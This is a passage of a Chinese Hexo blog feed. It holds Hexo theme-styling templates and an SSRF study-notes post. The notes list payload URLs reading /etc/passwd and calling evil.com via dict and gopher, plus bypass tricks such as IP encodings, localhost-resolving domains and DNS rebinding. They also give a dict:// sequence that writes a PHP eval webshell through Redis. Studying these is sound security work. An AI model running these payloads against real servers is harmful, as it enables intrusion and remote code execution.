class="line">信天地广阔无奇不有，四海八方终有归处。信万物有宗法，善恶皆有报。信有百鬼横行就必有英雄出世，所有的苦难故事都有被改变的终局。</span><br><span class="line">&#123;% endblockquote %&#125;</span><br></pre></td></tr></table></figure><p>显示</p><blockquote><p>信天地广阔无奇不有，四海八方终有归处。信万物有宗法，善恶皆有报。信有百鬼横行就必有英雄出世，所有的苦难故事都有被改变的终局。 </p></blockquote><p><strong>引用自书籍</strong></p><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% blockquote David 渡鸦 %&#125;</span><br><span class="line">白日已死，长夜不眠，唯一的月亮还生了锈</span><br><span class="line">那就把他点燃，让他照亮</span><br><span class="line">我在辛迪加的土地上，见证绝望，也见证希望</span><br><span class="line">沉醉黑暗，也追寻光明</span><br><span class="line">撰写诗篇，也化为诗篇</span><br><span class="line">为敬那些</span><br><span class="line">锈烬中复燃的火🔥</span><br><span class="line">朽林里咆哮的风🌪️</span><br><span class="line">敬暴雨中振翅的燕🐦</span><br><span class="line">淤泥里怒放的花🌹</span><br><span class="line">敬理想，敬希望，敬未来！</span><br><span class="line">&#123;% endblockquote %&#125;</span><br></pre></td></tr></table></figure><p>显示：</p><blockquote><p>白日已死，长夜不眠，唯一的月亮还生了锈<br>那就把他点燃，让他照亮<br>我在辛迪加的土地上，见证绝望，也见证希望<br>沉醉黑暗，也追寻光明<br>撰写诗篇，也化为诗篇<br>为敬那些<br>锈烬中复燃的火🔥<br>朽林里咆哮的风🌪️<br>敬暴雨中振翅的燕🐦<br>淤泥里怒放的花🌹<br>敬理想，敬希望，敬未来！</p><footer><strong>渡鸦——赞美诗</strong></footer></blockquote><p><strong>引自推特</strong></p><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% blockquote @DevDocs https://twitter.com/devdocs/status/356095192085962752 %&#125;  </span><br><span class="line">新增功能：DevDocs 现在提供语法高亮功能。 http://devdocs.io  </span><br><span class="line">&#123;% endblockquote %&#125;</span><br></pre></td></tr></table></figure><p>显示</p><blockquote><p>新增功能：DevDocs 现在提供语法高亮功能。<a href="http://devdocs.io/">http://devdocs.io</a></p><footer><strong>@DevDocs</strong><cite><a href="https://twitter.com/devdocs/status/356095192085962752">twitter.com/devdocs/status/356095192085962752</a></cite></footer></blockquote><p><strong>引自网络上的一篇文章</strong></p><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% blockquote Seth Godin http://sethgodin.typepad.com/seths_blog/2009/07/welcome-to-island-marketing.html 欢迎来到 Island Marketing %&#125;  </span><br><span class="line">每一次互动都是珍贵的，也是令人愉悦的机会。 </span><br><span class="line">&#123;% endblockquote %&#125;</span><br></pre></td></tr></table></figure><p>显示：</p><blockquote><p>每一次互动都是珍贵的，也是令人愉悦的机会。 </p><footer><strong>Seth Godin</strong><cite><a href="http://sethgodin.typepad.com/seths_blog/2009/07/welcome-to-island-marketing.html">欢迎来到 Island Marketing</a></cite></footer></blockquote><h2 id="行"><a href="#行" class="headerlink" title="行"></a>行</h2><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% raw %&#125;  </span><br><span class="line">content  </span><br><span class="line">&#123;% endraw %&#125;</span><br></pre></td></tr></table></figure><p>显示</p>  content  <h2 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h2><p><strong>普通代码块</strong>：</p><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% codeblock %&#125;  </span><br><span class="line">alert(&#x27;Hello World!&#x27;);  </span><br><span class="line">&#123;% endcodeblock %&#125;</span><br></pre></td></tr></table></figure><p>显示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line">alert(&#x27;Hello World!&#x27;);  </span><br></pre></td></tr></table></figure><p><strong>语言指定</strong></p><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% codeblock lang:objc %&#125;  </span><br><span class="line">[rectangle setX: 10 y: 10 width: 20 height: 20];  </span><br><span class="line">&#123;% endcodeblock %&#125;</span><br></pre></td></tr></table></figure><p>显示：</p><figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line">[rectangle setX: <span class="number">10</span> y: <span class="number">10</span> width: <span class="number">20</span> height: <span class="number">20</span>];  </span><br></pre></td></tr></table></figure><p><strong>代码块添加标题</strong></p><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% codeblock Array.map %&#125;  </span><br><span class="line">array.map(callback[, thisArg])  </span><br><span class="line">&#123;% endcodeblock %&#125;</span><br></pre></td></tr></table></figure><p>显示：</p><figure class="highlight plaintext"><figcaption><span>Array.map</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line">array.map(callback[, thisArg])  </span><br></pre></td></tr></table></figure><p><strong>添加标题和 URL</strong></p><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% codeblock _.compact http://underscorejs.org/#compact Underscore.js %&#125;  </span><br><span class="line">_.compact([0, 1, false, 2, &#x27;&#x27;, 3]);  </span><br><span class="line">=&gt; [1, 2, 3]  </span><br><span class="line">&#123;% endcodeblock %&#125;</span><br></pre></td></tr></table></figure><p>显示:</p><figure class="highlight plaintext"><figcaption><span>_.compact</span><a href="http://underscorejs.org/#compact">Underscore.js</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line">_.compact([0, 1, false, 2, &#x27;&#x27;, 3]);  </span><br><span class="line">=&gt; [1, 2, 3]  </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 范式阅读 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 美化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF基础学习</title>
      <link href="/2024/10/02/SSRF/"/>
      <url>/2024/10/02/SSRF/</url>
      
        <content type="html"><![CDATA[<blockquote class="blockquote-center">            <i class="fa fa-quote-left"></i>            <p>关于基本十大漏洞之一SSRF的一些学习笔记,主要涵盖SSRF盲打，协议的使用，SSRF+redis的内容</p>            <i class="fa fa-quote-right"></i>          </blockquote><span id="more"></span><p>参考网址：<a href="https://xz.aliyun.com/t/12227?time__1311=GqGxRDcGD=0=0QD/YriQ=Tqmq0I3xE8270bD#toc-10">SRC中的SSRF漏洞挖掘笔记1.0 - 先知社区 (aliyun.com)</a></p><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p><strong>服务端请求伪造</strong>（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。</p><p>SSRF攻击通常针对外部网络无法直接访问的内部网络。</p><p>漏洞形成的原因大多是因为服务端提供了从其他服务器应用获取数据的功能且没有对目标地址作过滤和限制。</p><h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p><img src="https://i.imgur.com/yd0yD7S.png"></p><ul><li>第一个请求Requeset1 通常是HTTP协议</li><li>第二个请求Requeset2 由应用程序本身功能决定 理论上可以有各种protocol&#x2F;scheme，攻击者可以进行构造进行利用,一般常用的协议有<code>file://</code>，<code>dict://</code>，<code>gopher://</code>，<code>http://</code>,<code>https://</code> <ul><li><code>file://</code> <code>http://example.com/ssrf.php?url=file:///etc/passwd</code></li><li>SSH <code>scp://</code> <code>sftp://</code></li><li><code>dict://</code> <code>http://example.com/ssrf.php?dict://evil.com:1337/</code></li><li><code>ldap://</code> LDAP(Lightweight Directory Access Protocol,轻量级目录访问协议)<ul><li><code>http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquit</code></li><li><code>http://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquit</code></li><li><code>http://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit</code></li></ul></li><li><code>gopher://</code><ul><li>重要作用:几乎可与任意<strong>TCP</strong> service交互<ul><li>(1)指定<code>ip</code> <code>port</code> <code>bytes</code></li><li>(2)您可以利用 SSRF 与任何 TCP 服务进行通信。（但您需要首先知道如何与该服务通信。）</li></ul></li><li>利用过程 <code>http://example.com/ssrf.php?url=http://evil.com/gopher.php</code> 重定向到 <code>gopher://yourlink.tld</code>. <a href="https://github.com/1135/notes/blob/master/web_vul_SSRF.md#ssrf%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B---gopher%E5%8D%8F%E8%AE%AE%E7%BB%93%E5%90%88%E8%B7%B3%E8%BD%AC">详细过程</a></li></ul></li><li><code>tftp://</code> TFTP（Trivial File Transfer Protocol,简单文件传输协议) works over UDP<ul><li>重要作用:几乎可构造并发送任意的<strong>UDP</strong> packets</li><li>利用过程</li></ul></li></ul></li></ul><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><ul><li><p>攻击者角度 按漏洞利用效果分类</p><ul><li>Basic SSRF - <strong>可回显</strong><ul><li>描述 : 攻击者可见【3】resp Body, 它通常与【4】resp Body完全相同<ul><li>to内网 - 攻击者可利用”SSRFserver”访问内网主机 (如同一内网的<code>oa.intranet.apple-inc.com</code>) 并在”SSRFserver”域下看到内网的<code>oa.intranet.apple-inc.com</code>的响应内容(如 oa登录页面)</li><li>to公网 - 攻击者可利用”SSRFserver”访问公网主机 (如攻击者的<code>evil.com</code>) 并在”SSRFserver”域下看到<code>evil.com</code>的响应内容(如 XSSpayload)</li></ul></li></ul></li><li>Blind SSRF - <strong>不可回显</strong><ul><li>描述 : 攻击者看不到【3】resp Body. 攻击者只能用<strong>间接</strong>方式 观察 判断<ul><li>HTTP response status - HTTP响应的状态码(200 500)</li><li>HTTP response time - 时间间隔的长短(得到HTTP响应时间点-发起HTTP请求的时间点)</li></ul></li><li>如果执行的 SSRF 攻击是没有输出的 盲SSRF 类型，你还需要使用外部 HTTP 日志记录工具来监视http请求消息，例如 <code>requestbin.com</code>、你自己的 HTTP 服务器或 BurpSuite 的 <code>Collaborator</code> 客户端。</li></ul></li></ul></li></ul><p>主要分为常规SSRF(有回显)与盲SSRF(blind盲)</p><h1 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h1><ol><li><p>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的 banner 信息</p></li><li><p>攻击运行在内网或本地的应用程序（比如溢出）</p></li><li><p>对内网 WEB 应用进行指纹识别，通过访问默认文件实现</p></li><li><p>攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击（比如 Struts2，sqli 等）</p></li><li><p>利用 <code>file</code> 协议读取本地文件等</p></li><li><p>获取到身份验证令牌&#x2F;凭证</p></li></ol><h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><p>一些应用程序会阻止包含诸如 <code>localhost</code> 或 <code>127.0.0.1</code> 之类的主机名，或包含敏感 URL 的输入。在这种情况下，您可以使用以下技术绕过过滤器：</p><ol><li><p><strong>使用 <code>localhost</code> 的替代 IP 表示形式</strong>，</p><ul><li>IP地址的不同形式 - 进制转换(学名为<strong>回环地址绕过</strong>)<ul><li>十进制形式 <code>127.0.0.1 &lt;-&gt; 2130706433</code> 计算方法<code>(127)*256^3+(0)*256^2+(0)*256^1+(1)*256^0=2130706433</code> <code>(21)*256^1+(200)=5576</code> 如bing的外网IP转换为十进制形式 <code>13.107.21.200 &lt;-&gt; 13.107.5576 &lt;-&gt; 13.7017928 &lt;-&gt; 225121736</code></li><li>十六进制形式 <code>13.107.21.200 &lt;-&gt; 0xD6B15C8</code></li><li>IP变形例子: <code>127.0.0.1</code> 八进制Octal<code>017700000001</code> 十进制Dec<code>2130706433</code> 十六进制Hex<code>0x7F000001</code></li><li>混合各形式 如八进制.十进制 <code>13.107.21.200 &lt;-&gt; 015.7017928</code></li></ul></li></ul></li><li><p>**注册您自己的域名并将其解析到 <code>localhost</code>**。您可以使用 <code>spoofed.burpcollaborator.net</code> 来实现此目的。</p><ul><li>因为 <a href="http://localhost/">http://localhost/</a> 和 <a href="http://127.0.0.1/">http://127.0.0.1</a> 没有 http 形式，但是可以买一个域名，解析到 127.0.0.1。如果不想折腾，可以用现成的（都是大厂域名）：<br>  <a href="http://safe.taobao.com/">http://safe.taobao.com/</a><br>  <a href="http://114.taobao.com/">http://114.taobao.com/</a><br>  <a href="http://wifi.aliyun.com/">http://wifi.aliyun.com/</a><br>  <a href="http://imis.qq.com/">http://imis.qq.com/</a><br>  <a href="http://localhost.sec.qq.com/">http://localhost.sec.qq.com/</a><br>  <a href="http://ecd.tencent.com/">http://ecd.tencent.com/</a></li></ul></li><li><p><strong>使用 URL 编码或大小写变化来混淆被阻止的字符串</strong>，<strong>或者使用@ <code>a.com@10.10.10.10</code> <code>a.com:b@10.10.10.10</code>。</strong></p></li><li><p><strong>提供一个您控制的 URL，该 URL 重定向到目标 URL</strong>。尝试使用不同的重定向代码，以及目标 URL 的不同协议。例如，在重定向期间将 URL 从 <code>http:</code> 切换到 <code>https:</code> 已被证明可以绕过一些反 SSRF 过滤器。</p></li><li><p><strong>- 短网址跳转 - “短网址”响应(301 永久重定向)到内网地址 <code>http://10.10.116.11 =&gt; http://t.cn/RwbLKDx</code></strong></p><ul><li>工具网址：<a href="https://my5353.com/">短网址生成器 | LinkShortener (my5353.com)</a><img src="https://i.imgur.com/y9VL5Nh.png"></li></ul></li><li><p>DNS重绑定</p><ol><li><a href="https://lock.cmpxchg8b.com/rebinder.html">rbndr.us DNS 重新绑定服务 — rbndr.us dns rebinding service (cmpxchg8b.com)</a> <img src="https://i.imgur.com/ml7PVRm.png"></li></ol></li></ol><p><img src="https://cdn.nlark.com/yuque/0/2024/png/26698826/1707585889614-0db59115-3bbc-44b3-8938-d867e0888105.png?x-oss-process=image/format,webp/resize,w_847,limit_0/watermark,type_d3F5LW1pY3JvaGVp,size_24,text_eml5ZWJ1a3U=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10/resize,w_847,limit_0"></p><h1 id="SSRF-redis"><a href="#SSRF-redis" class="headerlink" title="SSRF+redis"></a>SSRF+redis</h1><p>ssrf可以通过http和dict协议进行端口扫描</p><p>第一个：手写</p><blockquote><p>[!NOTE] 手写redis的webshell</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">dict://localhost:6378/flushall</span><br><span class="line">dict://localhost:6378/config:<span class="built_in">set</span>:<span class="built_in">dir</span>:/var/www/html/app1</span><br><span class="line">dict://localhost:6378/config:<span class="built_in">set</span>:dbfilename:hh.php</span><br><span class="line">dict://localhost:6378/set:1:<span class="string">&quot;\x3c\x3f\x70\x68\x70\x20\x40\x65\x76\x61\x6c\x28\x24\x5f\x50\x4f\x53\x54\x5b\x77\x5d\x29\x3b\x3f\x3e&quot;</span></span><br><span class="line">dict://localhost:6378/save</span><br><span class="line"></span><br><span class="line">webshell密码w</span><br></pre></td></tr></table></figure></blockquote><p>第二个：gopaer协议url</p><p>ssrf可以通过http和dict协议进行端口扫描  </p><p>后续参照：</p><p><a href="https://xz.aliyun.com/t/15251?u_atoken=691d34d01e071a9852e9493cb8427982&u_asig=0a472f8c17279634543966257e004a">从靶场中学习OAuth - 先知社区 (aliyun.com)</a></p><p><a href="https://xz.aliyun.com/t/15249">XSS之Flash弹窗钓鱼和文件上传getshell各种姿势 - 先知社区 (aliyun.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>参考样式</title>
      <link href="/2024/10/02/%E6%A8%A1%E6%9D%BF%E5%8F%82%E8%80%83%E6%A0%B7%E5%BC%8F/"/>
      <url>/2024/10/02/%E6%A8%A1%E6%9D%BF%E5%8F%82%E8%80%83%E6%A0%B7%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<blockquote class="blockquote-center">            <i class="fa fa-quote-left"></i>            <p>因为看着头疼所以简单整理了一下Hexo主题的样式，然后也干脆作为模板了</p>            <i class="fa fa-quote-right"></i>          </blockquote><span id="more"></span><h1 id="引用样式"><a href="#引用样式" class="headerlink" title="引用样式"></a>引用样式</h1><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- HTML方式: 直接在 Markdown 文件中编写 HTML 来调用 --&gt;</span><br><span class="line">&lt;!-- 其中 class=&quot;blockquote-center&quot; 是必须的 --&gt;</span><br><span class="line">&lt;blockquote class=&quot;blockquote-center&quot;&gt;样式一&lt;/blockquote&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 标签 方式，要求版本在0.4.5或以上 --&gt;  </span><br><span class="line">&#123;% centerquote %&#125;样式二&#123;% endcenterquote %&#125;</span><br><span class="line"></span><br><span class="line">&lt;!-- 标签别名 --&gt;</span><br><span class="line">&#123;% cq %&#125; 样式三&#123;% endcq %&#125;</span><br></pre></td></tr></table></figure><!-- HTML方式: 直接在 Markdown 文件中编写 HTML 来调用 --><!-- 其中 class="blockquote-center" 是必须的 --><blockquote class="blockquote-center">样式一</blockquote><!-- 标签 方式，要求版本在0.4.5或以上 --><blockquote class="blockquote-center">            <i class="fa fa-quote-left"></i>            <p>样式二</p>            <i class="fa fa-quote-right"></i>          </blockquote><!-- 标签别名 --><blockquote class="blockquote-center">            <i class="fa fa-quote-left"></i>            <p>样式三</p>            <i class="fa fa-quote-right"></i>          </blockquote><h2 id="提示框样式"><a href="#提示框样式" class="headerlink" title="提示框样式"></a>提示框样式</h2><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note class_name %&#125; Content (md partial supported) &#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>显示：</p><div class="note class_name">            <p>Content (md partial supported) </p>          </div><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note default %&#125; Content (md partial supported) &#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>显示</p><div class="note default">            <p>Content (md partial supported) </p>          </div><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note primary %&#125; Content (md partial supported) &#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>显示：</p><div class="note primary">            <p>Content (md partial supported) </p>          </div><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note success %&#125; Content (md partial supported) &#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>显示</p><div class="note success">            <p>Content (md partial supported) </p>          </div><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note info %&#125; Content (md partial supported) &#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>显示</p><div class="note info">            <p>Content (md partial supported) </p>          </div><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note warning %&#125; Content (md partial supported) &#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>显示</p><div class="note warning">            <p>Content (md partial supported) </p>          </div><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note danger %&#125; Content (md partial supported) &#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>显示:</p><div class="note danger">            <p>Content (md partial supported) </p>          </div><h2 id="块引用"><a href="#块引用" class="headerlink" title="块引用"></a>块引用</h2><p>非常适合在您的帖子中添加引文，其中包含可选的作者、来源和标题信息。</p><p><strong>Alias:</strong> quote </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% blockquote [author[, source]] [link] [source_link_title] %&#125;  </span><br><span class="line">content  </span><br><span class="line">&#123;% endblockquote %&#125;</span><br></pre></td></tr></table></figure><h3 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h3><p><strong>没有参数，普通的块引用</strong></p><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% blockquote %&#125;</span><br><span class="line">信天地广阔无奇不有，四海八方终有归处。信万物有宗法，善恶皆有报。信有百鬼横行就必有英雄出世，所有的苦难故事都有被改变的终局。</span><br><span class="line">&#123;% endblockquote %&#125;</span><br></pre></td></tr></table></figure><p>显示</p><blockquote><p>信天地广阔无奇不有，四海八方终有归处。信万物有宗法，善恶皆有报。信有百鬼横行就必有英雄出世，所有的苦难故事都有被改变的终局。 </p></blockquote><p><strong>引用自书籍</strong></p><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% blockquote David 渡鸦 %&#125;</span><br><span class="line">白日已死，长夜不眠，唯一的月亮还生了锈</span><br><span class="line">那就把他点燃，让他照亮</span><br><span class="line">我在辛迪加的土地上，见证绝望，也见证希望</span><br><span class="line">沉醉黑暗，也追寻光明</span><br><span class="line">撰写诗篇，也化为诗篇</span><br><span class="line">为敬那些</span><br><span class="line">锈烬中复燃的火🔥</span><br><span class="line">朽林里咆哮的风🌪️</span><br><span class="line">敬暴雨中振翅的燕🐦</span><br><span class="line">淤泥里怒放的花🌹</span><br><span class="line">敬理想，敬希望，敬未来！</span><br><span class="line">&#123;% endblockquote %&#125;</span><br></pre></td></tr></table></figure><p>显示：</p><blockquote><p>白日已死，长夜不眠，唯一的月亮还生了锈<br>那就把他点燃，让他照亮<br>我在辛迪加的土地上，见证绝望，也见证希望<br>沉醉黑暗，也追寻光明<br>撰写诗篇，也化为诗篇<br>为敬那些<br>锈烬中复燃的火🔥<br>朽林里咆哮的风🌪️<br>敬暴雨中振翅的燕🐦<br>淤泥里怒放的花🌹<br>敬理想，敬希望，敬未来！</p><footer><strong>渡鸦——赞美诗</strong></footer></blockquote><p><strong>引自推特</strong></p><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% blockquote @DevDocs https://twitter.com/devdocs/status/356095192085962752 %&#125;  </span><br><span class="line">新增功能：DevDocs 现在提供语法高亮功能。 http://devdocs.io  </span><br><span class="line">&#123;% endblockquote %&#125;</span><br></pre></td></tr></table></figure><p>显示</p><blockquote><p>新增功能：DevDocs 现在提供语法高亮功能。<a href="http://devdocs.io/">http://devdocs.io</a></p><footer><strong>@DevDocs</strong><cite><a href="https://twitter.com/devdocs/status/356095192085962752">twitter.com/devdocs/status/356095192085962752</a></cite></footer></blockquote><p><strong>引自网络上的一篇文章</strong></p><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% blockquote Seth Godin http://sethgodin.typepad.com/seths_blog/2009/07/welcome-to-island-marketing.html 欢迎来到 Island Marketing %&#125;  </span><br><span class="line">每一次互动都是珍贵的，也是令人愉悦的机会。 </span><br><span class="line">&#123;% endblockquote %&#125;</span><br></pre></td></tr></table></figure><p>显示：</p><blockquote><p>每一次互动都是珍贵的，也是令人愉悦的机会。 </p><footer><strong>Seth Godin</strong><cite><a href="http://sethgodin.typepad.com/seths_blog/2009/07/welcome-to-island-marketing.html">欢迎来到 Island Marketing</a></cite></footer></blockquote><h2 id="行"><a href="#行" class="headerlink" title="行"></a>行</h2><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% raw %&#125;  </span><br><span class="line">content  </span><br><span class="line">&#123;% endraw %&#125;</span><br></pre></td></tr></table></figure><p>显示</p>  content  <h2 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h2><p><strong>普通代码块</strong>：</p><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% codeblock %&#125;  </span><br><span class="line">alert(&#x27;Hello World!&#x27;);  </span><br><span class="line">&#123;% endcodeblock %&#125;</span><br></pre></td></tr></table></figure><p>显示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line">alert(&#x27;Hello World!&#x27;);  </span><br></pre></td></tr></table></figure><p><strong>语言指定</strong></p><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% codeblock lang:objc %&#125;  </span><br><span class="line">[rectangle setX: 10 y: 10 width: 20 height: 20];  </span><br><span class="line">&#123;% endcodeblock %&#125;</span><br></pre></td></tr></table></figure><p>显示：</p><figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line">[rectangle setX: <span class="number">10</span> y: <span class="number">10</span> width: <span class="number">20</span> height: <span class="number">20</span>];  </span><br></pre></td></tr></table></figure><p><strong>代码块添加标题</strong></p><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% codeblock Array.map %&#125;  </span><br><span class="line">array.map(callback[, thisArg])  </span><br><span class="line">&#123;% endcodeblock %&#125;</span><br></pre></td></tr></table></figure><p>显示：</p><figure class="highlight plaintext"><figcaption><span>Array.map</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line">array.map(callback[, thisArg])  </span><br></pre></td></tr></table></figure><p><strong>添加标题和 URL</strong></p><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% codeblock _.compact http://underscorejs.org/#compact Underscore.js %&#125;  </span><br><span class="line">_.compact([0, 1, false, 2, &#x27;&#x27;, 3]);  </span><br><span class="line">=&gt; [1, 2, 3]  </span><br><span class="line">&#123;% endcodeblock %&#125;</span><br></pre></td></tr></table></figure><p>显示:</p><figure class="highlight plaintext"><figcaption><span>_.compact</span><a href="http://underscorejs.org/#compact">Underscore.js</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line">_.compact([0, 1, false, 2, &#x27;&#x27;, 3]);  </span><br><span class="line">=&gt; [1, 2, 3]  </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 范式阅读 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 美化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux应急响应基础学习</title>
      <link href="/2024/10/01/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
      <url>/2024/10/01/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</url>
      
